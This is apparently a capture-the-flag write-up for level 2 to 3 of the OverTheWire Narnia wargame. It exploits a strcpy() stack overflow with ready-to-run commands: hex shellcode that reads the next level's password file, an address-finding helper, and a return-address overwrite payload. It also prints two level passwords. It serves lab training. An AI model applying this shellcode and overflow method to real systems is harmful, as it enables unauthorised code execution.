# Narnia Level 02 to 03

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Narnia |
| Level | 2 -> 3 |
| Status | Complete |

## Objective

Exploit the classic `strcpy()` stack overflow in `narnia2` and recover `narnia3`.

## Given Access

User: `narnia2`

Password:

```text
5agRAXeBdG
```

## Recon

`/narnia/narnia2.c` copies `argv[1]` into a 128-byte stack buffer with `strcpy()`. With ASLR disabled, this is a straightforward overwrite of saved return state into shellcode stored in `EGG`.

## Method

1. Put shellcode for `cat /etc/narnia_pass/narnia3` into `EGG`.
2. Compile a small `getenv` helper to estimate the runtime address of `EGG` for `/narnia/narnia2`.
3. Overflow the return address after 132 filler bytes and jump into the environment payload.

## Commands

```bash
ssh -p 2226 narnia2@narnia.labs.overthewire.org
wd=$(mktemp -d /tmp/n2.XXXXXX)
cd "$wd"
printf '6a01fe0c24686e696133682f6e61726870617373686e69615f682f6e6172682f65746389e331c96a0558cd806a015b89c131d268ffffff7f5e31c0b0bbcd80' | xxd -r -p > sc.bin
cat > getenv.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char **argv){
  char *ptr = getenv(argv[1]);
  ptr += (strlen(argv[0]) - strlen(argv[2]))*2;
  printf("%p\n", ptr);
}
EOF
gcc -m32 -o getenv getenv.c
export EGG=$(python3 -c 'import sys;sys.stdout.buffer.write(open("sc.bin","rb").read())')
./getenv EGG /narnia/narnia2   # -> 0xffffddb8 during the verified run
python3 -c 'import struct,sys;sys.stdout.buffer.write(b"A"*132+struct.pack("<I",0xffffddb8))' > arg.bin
/narnia/narnia2 "$(cat arg.bin)"
```

## Result

Password for `narnia3`:

```text
2xszzNl6uG
```

## Lesson

When environment execution is still available, a tiny address-recovery helper can remove most of the guesswork from a stack overflow.

## References

- https://overthewire.org/wargames/narnia/
